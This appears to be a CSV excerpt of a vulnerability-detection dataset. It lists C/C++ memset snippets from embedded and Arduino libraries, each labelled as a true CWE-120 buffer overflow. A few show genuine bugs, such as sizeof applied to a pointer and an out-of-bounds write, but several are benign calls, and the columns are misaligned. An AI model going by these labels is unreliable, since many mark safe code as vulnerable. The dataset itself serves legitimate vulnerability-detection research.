GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\a9_gsm_gps_library\a9_mqtt_lib\src\mqtt_lib.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_mqtt_lib\src\mqtt_lib.c,"memset(&ci, 0, sizeof(MQTT_Connect_Info_t));",120,1,"    MQTT_Connect_Info_t ci;
    MQTT_Error_t err;
    memset(&ci, 0, sizeof(MQTT_Connect_Info_t));
    ci.client_id = client_id;
    ci.client_user = CLIENT_USER;
"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(send_buff, 0, sizeof(send_buff));",120,1,"	send_buff = OS_Malloc(10);
	rev_buff = OS_Malloc(10);
	memset(send_buff, 0, sizeof(send_buff));
	memset(rev_buff, 0, sizeof(rev_buff));

"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(rev_buff, 0, sizeof(rev_buff));",120,1,"	rev_buff = OS_Malloc(10);
	memset(send_buff, 0, sizeof(send_buff));
	memset(rev_buff, 0, sizeof(rev_buff));

	strcpy(send_buff, ""123456789"");
"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(send_buff, 0xaa, sizeof(send_buff));",120,1,"	send_buff = OS_Malloc(4000);
	rev_buff = OS_Malloc(4000);
	memset(send_buff, 0xaa, sizeof(send_buff));
    memset(rev_buff, 0, sizeof(rev_buff));
    
"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(send_buff, 0xab, 4000);",120,1,"	uint8_t *send_buff;
	send_buff = OS_Malloc(4000);
	memset(send_buff, 0xab, 4000);

	OS_Sleep(5000);
"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\WebSocketsServer.cpp,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\WebSocketsServer.cpp,"memset(&_clients[0], 0x00, (sizeof(WSclient_t) * WEBSOCKETS_SERVER_CLIENT_MAX));",120,1,"    _mandatoryHttpHeaderCount = 0;

    memset(&_clients[0], 0x00, (sizeof(WSclient_t) * WEBSOCKETS_SERVER_CLIENT_MAX));
}

"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,"memset(block, '\0', sizeof(block));",120,1,"    a = b = c = d = e = 0;
#ifdef SHA1HANDSOFF
    memset(block, '\0', sizeof(block));
#endif
}
"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,"memset(context, '\0', sizeof(*context));",120,1,"    }
    /* Wipe variables */
    memset(context, '\0', sizeof(*context));
    memset(&finalcount, '\0', sizeof(finalcount));
}
"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,"memset(&finalcount, '\0', sizeof(finalcount));",120,1,"    /* Wipe variables */
    memset(context, '\0', sizeof(*context));
    memset(&finalcount, '\0', sizeof(finalcount));
}
/* ================ end of sha1.c ================ */
"
2021\arduino-learn-circuit\libraries\pubsubclient-master\tests\src\receive_spec.cpp,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\pubsubclient-master\tests\src\receive_spec.cpp,"memset(bigPublish,'A',length);",120,1,"    byte publish[] = {0x30,length-2,0x0,0x5,0x74,0x6f,0x70,0x69,0x63,0x70,0x61,0x79,0x6c,0x6f,0x61,0x64};
    byte bigPublish[length];
    memset(bigPublish,'A',length);
    bigPublish[length] = 'B';
    memcpy(bigPublish,publish,16);
"
